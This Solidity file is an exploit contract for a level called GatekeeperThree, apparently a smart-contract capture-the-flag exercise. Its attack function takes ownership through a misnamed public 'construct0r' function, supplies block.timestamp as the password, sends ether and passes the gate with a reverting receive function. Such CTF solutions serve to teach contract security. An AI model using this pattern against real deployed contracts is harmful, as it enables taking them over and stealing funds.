// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;

    function createTrick() external;

    function getAllowance(uint256 _password) external;

    function enter() external returns (bool entered);
}

contract GatekeeperThreeHack {
    function attack(address _gatekeeperThreeAddress) public payable {
        IGatekeeperThree victim = IGatekeeperThree(_gatekeeperThreeAddress);
        victim.construct0r();
        victim.createTrick();
        victim.getAllowance(block.timestamp);
        (bool success, ) = payable(address(victim)).call{value: 0.002 ether}(
            ""
        );
        require(success);
        require(victim.enter());
    }

    receive() external payable {
        revert();
    }
}
